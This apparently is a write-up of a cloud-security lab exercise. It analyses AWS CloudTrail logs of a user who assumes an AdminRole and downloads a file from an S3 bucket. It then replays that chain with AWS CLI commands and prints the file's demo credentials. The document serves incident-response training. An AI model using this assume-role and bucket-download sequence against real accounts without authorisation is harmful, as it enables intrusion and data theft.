https://app.pwnedlabs.io/labs/breach-in-the-cloud

### Scenario

We've been alerted to a potential security incident. The Huge Logistics security team have provided you with AWS keys of an account that saw unusual activity, as well as AWS CloudTrail logs around the time of the activity. We need your expertise to confirm the breach by analyzing our CloudTrail logs, identifying the compromised AWS service and any data that was exfiltrated.

### Information provided

```
AWS credentials

Access key ID: AKIAR<REDACTED> 

Secret access key: Wv7hFnsh<REDACTED> 
```

To get started, download the CloudTrail logs in `INCIDENT-3252.zip` from the 🔎-case-files channel in the Pwned Labs [Discord](https://discord.gg/pwnedlabs).

#### First log file

```
        {

            "eventVersion": "1.08",

            "userIdentity": {

                "type": "IAMUser",

                "principalId": "AIDARSCCN4A3X2YWZ37ZI",

                "arn": "arn:aws:iam::107513503799:user/temp-user",

                "accountId": "107513503799",

                "accessKeyId": "AKIARSCCN4A3WD4RO4P4",

                "userName": "temp-user"

            },

            "eventTime": "2023-08-26T20:29:37Z",

            "eventSource": "sts.amazonaws.com",

            "eventName": "GetCallerIdentity",

            "awsRegion": "us-east-1",

            "sourceIPAddress": "84.32.71.19",

            "userAgent": "aws-cli/1.27.74 Python/3.10.6 Linux/5.15.90.1-microsoft-standard-WSL2 botocore/1.29.74",

            "requestParameters": null,

            "responseElements": null,

            "requestID": "3db296ab-c531-4b4a-a468-e1b05ec83246",

            "eventID": "ea6ae4b8-aae8-4fca-a495-2df427bdce46",

            "readOnly": true,

            "eventType": "AwsApiCall",

            "managementEvent": true,

            "recipientAccountId": "107513503799",

            "eventCategory": "Management",

            "tlsDetails": {

                "tlsVersion": "TLSv1.2",

                "cipherSuite": "ECDHE-RSA-AES128-GCM-SHA256",

                "clientProvidedHostHeader": "sts.amazonaws.com"

            }

        },
```

In this log file, we find out a user called `temp-user` who has executed an AWS STS command. The command executed is `GetCallerIdentity` which is like `whoami`
Interesting thing is that all users can use this command whether they have access to it or not.
Nothing else is accessed by this user in this first log file.

#### Second log file

```
        {

            "eventVersion": "1.09",

            "userIdentity": {

                "type": "IAMUser",

                "principalId": "AIDARSCCN4A3X2YWZ37ZI",

                "arn": "arn:aws:iam::107513503799:user/temp-user",

                "accountId": "107513503799",

                "accessKeyId": "AKIARSCCN4A3WD4RO4P4",

                "userName": "temp-user"

            },

            "eventTime": "2023-08-26T20:35:56Z",

            "eventSource": "s3.amazonaws.com",

            "eventName": "ListObjects",

            "awsRegion": "us-east-1",

            "sourceIPAddress": "84.32.71.33",

            "userAgent": "[aws-cli/1.27.74 Python/3.10.6 Linux/5.15.90.1-microsoft-standard-WSL2 botocore/1.29.74]",

            "errorCode": "AccessDenied",

            "errorMessage": "Access Denied",

            "requestParameters": {

                "list-type": "2",

                "bucketName": "emergency-data-recovery",

                "encoding-type": "url",

                "prefix": "",

                "delimiter": "/",

                "Host": "emergency-data-recovery.s3.amazonaws.com"

            },

            "responseElements": null,

            "additionalEventData": {

                "SignatureVersion": "SigV4",

                "CipherSuite": "ECDHE-RSA-AES128-GCM-SHA256",

                "bytesTransferredIn": 0,

                "AuthenticationMethod": "AuthHeader",

                "x-amz-id-2": "q9TsSW1BnowYv+zugsIlX090vco3sQoqNqOL5ps6mBcjExJYjYkezvvYdDhdv1AjQxsYUgyV+ZfRKxrw7zVq4wzoiqpjhl8j7mYpN0IGlEI=",

                "bytesTransferredOut": 275

            },

            "requestID": "NG10BSS4SMQP47P2",

            "eventID": "a02cc8e0-a02b-4999-aada-da57265d198f",

            "readOnly": true,

            "resources": [

                {

                    "type": "AWS::S3::Object",

                    "ARNPrefix": "arn:aws:s3:::emergency-data-recovery/"

                },

                {

                    "accountId": "107513503799",

                    "type": "AWS::S3::Bucket",

                    "ARN": "arn:aws:s3:::emergency-data-recovery"

                }

            ],

            "eventType": "AwsApiCall",

            "managementEvent": false,

            "recipientAccountId": "107513503799",

            "eventCategory": "Data",

            "tlsDetails": {

                "tlsVersion": "TLSv1.2",

                "cipherSuite": "ECDHE-RSA-AES128-GCM-SHA256",

                "clientProvidedHostHeader": "emergency-data-recovery.s3.amazonaws.com"

            }

        }
```

In this second log file the `temp-user` has used the `ListObjects` command in AWS CLI. This command is used to list the objects present inside an S3 bucket.
The S3 bucket he tried to access was `emergency-data-recovery`.
However the access was denied, evident from the logs.


#### Third and Fourth log file

In these two log files, we can observe that `temp-user` has run hundreds of commands trying to get information about the AWS environment. However, he was unsuccessful in doing so since access was denied every time. This tells us that the attacker is using some sort of scripts to get information or trying to enumerate the environment.

#### Fifth log file

```
        {

            "eventVersion": "1.08",

            "userIdentity": {

                "type": "IAMUser",

                "principalId": "AIDARSCCN4A3X2YWZ37ZI",

                "arn": "arn:aws:iam::107513503799:user/temp-user",

                "accountId": "107513503799",

                "accessKeyId": "AKIARSCCN4A3WD4RO4P4",

                "userName": "temp-user"

            },

            "eventTime": "2023-08-26T20:54:28Z",

            "eventSource": "sts.amazonaws.com",

            "eventName": "AssumeRole",

            "awsRegion": "us-east-1",

            "sourceIPAddress": "84.32.71.33",

            "userAgent": "aws-cli/1.27.74 Python/3.10.6 Linux/5.15.90.1-microsoft-standard-WSL2 botocore/1.29.74",

            "requestParameters": {

                "roleArn": "arn:aws:iam::107513503799:role/AdminRole",

                "roleSessionName": "MySession"

            },

            "responseElements": {

                "credentials": {

                    "accessKeyId": "ASI<REDACTED>",

                    "sessionToken": "FwoGZXIvYXdzEK7/////<REDACTED>,

                    "expiration": "Aug 26, 2023, 9:54:28 PM"

                },

                "assumedRoleUser": {

                    "assumedRoleId": "AROARSCCN4A34V23XHK6I:MySession",

                    "arn": "arn:aws:sts::107513503799:assumed-role/AdminRole/MySession"

                }

            },

            "requestID": "9953505c-eed7-41f8-8ae5-98aa8197f69d",

            "eventID": "0fb23ccc-1bf6-4af8-bf3b-c93c1e040b7c",

            "readOnly": true,

            "resources": [

                {

                    "accountId": "107513503799",

                    "type": "AWS::IAM::Role",

                    "ARN": "arn:aws:iam::107513503799:role/AdminRole"

                }

            ],

            "eventType": "AwsApiCall",

            "managementEvent": true,

            "recipientAccountId": "107513503799",

            "eventCategory": "Management",

            "tlsDetails": {

                "tlsVersion": "TLSv1.2",

                "cipherSuite": "ECDHE-RSA-AES128-GCM-SHA256",

                "clientProvidedHostHeader": "sts.amazonaws.com"

            }

        },
```

In this log file, we can see that the attacker using the `temp-user` user ID has now used the `AssumeRole` command to impersonate a privileged user called `AdminRole` in a particular session. The complete ARN is `arn:aws:sts::107513503799:assumed-role/AdminRole/MySession`
Here, role name is `AdminRole` and session name is `MySession`.
After running the commands the attacker now has access to login as a privileged user `AdminRole`

#### Sixth log file

```
        {

            "eventVersion": "1.08",

            "userIdentity": {

                "type": "AssumedRole",

                "principalId": "AROARSCCN4A34V23XHK6I:MySession",

                "arn": "arn:aws:sts::107513503799:assumed-role/AdminRole/MySession",

                "accountId": "107513503799",

                "accessKeyId": "ASIARSCCN4A3QPI4OFEH",

                "sessionContext": {

                    "sessionIssuer": {

                        "type": "Role",

                        "principalId": "AROARSCCN4A34V23XHK6I",

                        "arn": "arn:aws:iam::107513503799:role/AdminRole",

                        "accountId": "107513503799",

                        "userName": "AdminRole"

                    },

                    "webIdFederationData": {},

                    "attributes": {

                        "creationDate": "2023-08-26T20:54:28Z",

                        "mfaAuthenticated": "false"

                    }

                }

            },

            "eventTime": "2023-08-26T20:59:54Z",

            "eventSource": "sts.amazonaws.com",

            "eventName": "GetCallerIdentity",

            "awsRegion": "us-east-1",

            "sourceIPAddress": "84.32.71.36",

            "userAgent": "aws-cli/1.27.74 Python/3.10.6 Linux/5.15.90.1-microsoft-standard-WSL2 botocore/1.29.74",

            "requestParameters": null,

            "responseElements": null,

            "requestID": "4afc1ae7-cac8-4a12-bf61-5d2b08c5aa46",

            "eventID": "010387ea-2bc8-45fb-8c5a-8ba865492209",

            "readOnly": true,

            "eventType": "AwsApiCall",

            "managementEvent": true,

            "recipientAccountId": "107513503799",

            "eventCategory": "Management",

            "tlsDetails": {

                "tlsVersion": "TLSv1.2",

                "cipherSuite": "ECDHE-RSA-AES128-GCM-SHA256",

                "clientProvidedHostHeader": "sts.amazonaws.com"

            }

        },
```

In here, we can see that the attacker has again used the STS command of `GetCallerIdentity` since now he is logged in as `AdminRole`

#### Seventh log file

```
        {

            "eventVersion": "1.09",

            "userIdentity": {

                "type": "AssumedRole",

                "principalId": "AROARSCCN4A34V23XHK6I:MySession",

                "arn": "arn:aws:sts::107513503799:assumed-role/AdminRole/MySession",

                "accountId": "107513503799",

                "accessKeyId": "ASIARSCCN4A3QPI4OFEH",

                "sessionContext": {

                    "sessionIssuer": {

                        "type": "Role",

                        "principalId": "AROARSCCN4A34V23XHK6I",

                        "arn": "arn:aws:iam::107513503799:role/AdminRole",

                        "accountId": "107513503799",

                        "userName": "AdminRole"

                    },

                    "attributes": {

                        "creationDate": "2023-08-26T20:54:28Z",

                        "mfaAuthenticated": "false"

                    }

                }

            },

            "eventTime": "2023-08-26T21:17:10Z",

            "eventSource": "s3.amazonaws.com",

            "eventName": "ListObjects",

            "awsRegion": "us-east-1",

            "sourceIPAddress": "84.32.71.125",

            "userAgent": "[aws-cli/1.27.74 Python/3.10.6 Linux/5.15.90.1-microsoft-standard-WSL2 botocore/1.29.74]",

            "requestParameters": {

                "list-type": "2",

                "bucketName": "emergency-data-recovery",

                "encoding-type": "url",

                "prefix": "",

                "delimiter": "/",

                "Host": "emergency-data-recovery.s3.amazonaws.com"

            },

            "responseElements": null,

            "additionalEventData": {

                "SignatureVersion": "SigV4",

                "CipherSuite": "ECDHE-RSA-AES128-GCM-SHA256",

                "bytesTransferredIn": 0,

                "AuthenticationMethod": "AuthHeader",

                "x-amz-id-2": "//dla90asaB7sRZXTbuSQaG5rtOxviSf1SC3im/6LQTOhD3tFSZysFdofEMhU1gXkE3oiBH/nk8y5wVNluX0qRKkaxaQYEgh",

                "bytesTransferredOut": 519

            },

            "requestID": "QZMC2W6C8BGT1Y84",

            "eventID": "368fb9a7-57a1-4575-be1a-49396544a363",

            "readOnly": true,

            "resources": [

                {

                    "type": "AWS::S3::Object",

                    "ARNPrefix": "arn:aws:s3:::emergency-data-recovery/"

                },

                {

                    "accountId": "107513503799",

                    "type": "AWS::S3::Bucket",

                    "ARN": "arn:aws:s3:::emergency-data-recovery"

                }

            ],

            "eventType": "AwsApiCall",

            "managementEvent": false,

            "recipientAccountId": "107513503799",

            "eventCategory": "Data",

            "tlsDetails": {

                "tlsVersion": "TLSv1.2",

                "cipherSuite": "ECDHE-RSA-AES128-GCM-SHA256",

                "clientProvidedHostHeader": "emergency-data-recovery.s3.amazonaws.com"

            }

        },
```

Now using the `AdminRole`, the attacker has listed all the objects present in the `emergency-data-recovery` S3 bucket. He is successful in doing so since he has elevated privileges now.

```
        {

            "eventVersion": "1.09",

            "userIdentity": {

                "type": "AssumedRole",

                "principalId": "AROARSCCN4A34V23XHK6I:MySession",

                "arn": "arn:aws:sts::107513503799:assumed-role/AdminRole/MySession",

                "accountId": "107513503799",

                "accessKeyId": "ASIARSCCN4A3QPI4OFEH",

                "sessionContext": {

                    "sessionIssuer": {

                        "type": "Role",

                        "principalId": "AROARSCCN4A34V23XHK6I",

                        "arn": "arn:aws:iam::107513503799:role/AdminRole",

                        "accountId": "107513503799",

                        "userName": "AdminRole"

                    },

                    "attributes": {

                        "creationDate": "2023-08-26T20:54:28Z",

                        "mfaAuthenticated": "false"

                    }

                }

            },

            "eventTime": "2023-08-26T21:17:16Z",

            "eventSource": "s3.amazonaws.com",

            "eventName": "GetObject",

            "awsRegion": "us-east-1",

            "sourceIPAddress": "84.32.71.3",

            "userAgent": "[aws-cli/1.27.74 Python/3.10.6 Linux/5.15.90.1-microsoft-standard-WSL2 botocore/1.29.74]",

            "requestParameters": {

                "bucketName": "emergency-data-recovery",

                "Host": "emergency-data-recovery.s3.amazonaws.com",

                "key": "emergency.txt"

            },

            "responseElements": null,

            "additionalEventData": {

                "SignatureVersion": "SigV4",

                "CipherSuite": "ECDHE-RSA-AES128-GCM-SHA256",

                "bytesTransferredIn": 0,

                "AuthenticationMethod": "AuthHeader",

                "x-amz-id-2": "S5P/Qy7vR4w9Tkj9+88CH6XQHdklRydOgiAFpSxTIPCQCzltnXpZTr4Ud1fHIPtxSg5P752b+eQHvS7hDpK0JOMaGUBKyjyV",

                "bytesTransferredOut": 2232

            },

            "requestID": "W1FD9W8N56T5NYSS",

            "eventID": "2c7763bf-100b-42dc-ba37-2937e5530ada",

            "readOnly": true,

            "resources": [

                {

                    "type": "AWS::S3::Object",

                    "ARN": "arn:aws:s3:::emergency-data-recovery/emergency.txt"

                },

                {

                    "accountId": "107513503799",

                    "type": "AWS::S3::Bucket",

                    "ARN": "arn:aws:s3:::emergency-data-recovery"

                }

            ],

            "eventType": "AwsApiCall",

            "managementEvent": false,

            "recipientAccountId": "107513503799",

            "eventCategory": "Data",

            "tlsDetails": {

                "tlsVersion": "TLSv1.2",

                "cipherSuite": "ECDHE-RSA-AES128-GCM-SHA256",

                "clientProvidedHostHeader": "emergency-data-recovery.s3.amazonaws.com"

            }

        }
```

Now the attacker has used `GetObject` to download the objects listed inside the S3 bucket. 


### Attack Chain Simulation

#### Assuming the `AdminRole`

```
aws sts assume-role --role-arn arn:aws:iam::107513503799:role/AdminRole --role-session-name MySession
```

```
Output:-

{                                                                                         "Credentials": {
        "AccessKeyId": "ASIA<REDACTED>",
        "SecretAccessKey": "aBFi9gP3<REDACTED>",
        "SessionToken": "FwoGZXIvYXdzEMP/////<REDACTED>",
        "Expiration": "2026-07-08T02:58:38+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROARSCCN4A34V23XHK6I:MySession",
        "Arn": "arn:aws:sts::107513503799:assumed-role/AdminRole/MySession"
    }
}
```

We got the credentials to login.

#### Logging in as `AdminRole`

```
aws configure


AWS Access Key ID [****************O4P4]: ASI<REDACTED>
AWS Secret Access Key [****************K7QJ]: aBFi9g<REDACTED>
AWS Session Token [None]: FwoGZXIvYXdzEMP////<REDACTED>
Default region name [None]: 
Default output format [None]: 
```

#### Confirming identity

```
aws sts get-caller-identity
```

```
Output:-

{                                                                                                                                                                                      "UserId": "AROARSCCN4A34V23XHK6I:MySession",
    "Account": "107513503799",
    "Arn": "arn:aws:sts::107513503799:assumed-role/AdminRole/MySession"
}
```


#### Listing the objects available

```
aws s3 ls s3://emergency-data-recovery
```

```
Output:-

2023-08-27 02:37:50       2232 emergency.txt
2023-08-27 03:49:02        236 message.txt
```

#### Displaying contents of the object

```
aws s3 cp s3://emergency-data-recovery/emergency.txt - 
```

This command prints the contents of the object on the terminal

```
Output:-

=========== Huge Logistics Emergency Recovery Plan ===========

flag: <REDACTED>

Purpose: This document provides a reference to essential credentials and steps to be taken during a disaster recovery scenario

---------------------
Date of Last Update: 8/26
Updated By: Jose
---------------------

--- On-Premise Systems ---

1. System Name: ERP System
   - Access URL/Endpoint: http://erpsystem.hugelogistics.local
   - Username: admin_erp
   - Password: dem0Passw0rd!ERP
   - Recovery Steps:
     1. Access the ERP System administrative console through the provided URL.
     2. Check system status and logs for any anomalies.
     3. Restore from the most recent backup if data corruption is detected.

2. System Name: Warehouse Management System
   - Access URL/Endpoint: http://warehouse.hugelogistics.local
   - Username: admin_warehouse
   - Password: dem0Passw0rd!WMS
   - Recovery Steps:
     1. Verify physical server integrity in the on-premise server room.
     2. Restart services related to the warehouse system.
     3. Confirm synchronization with other integrated systems.

--- Cloud Systems ---

1. System Name: Cloud-based Customer Portal
   - Cloud Provider: AWS
   - Access URL/Endpoint: http://customerportal.hugelogistics.com
   - IAM Role ARN: arn:aws:iam::accountID:role/DR_Role
   - Access Key: AKIAD3M0EX4MPL3DEMO
   - Secret Key: wJalrXUtnFEMI/K7MDENG/dem0accessKEY
   - Recovery Steps:
     1. Log into AWS Management Console with the provided IAM role.
     2. Navigate to EC2 Dashboard and verify the health of customer portal instances.
     3. Inspect CloudWatch Logs for any suspicious activities or system errors.

2. System Name: Cloud-based Tracking System
   - Cloud Provider: Azure
   - Access URL/Endpoint: http://tracking.hugelogistics.com
   - Service Principal ID: c2569dc2-eg1f-11ea-adc1-DEMOPRINCIPAL
   - Client Secret: 12345678-abcd-1234-efgh-56789abcdef01
   - Recovery Steps:
     1. Access Azure Portal and navigate to the Tracking System's Resource Group.
     2. Review the Application Insights associated with the tracking system.
     3. Perform a failover if primary region is experiencing issues.
```

Hence the attacker got credentials for a lot of critical systems which he can now compromise.
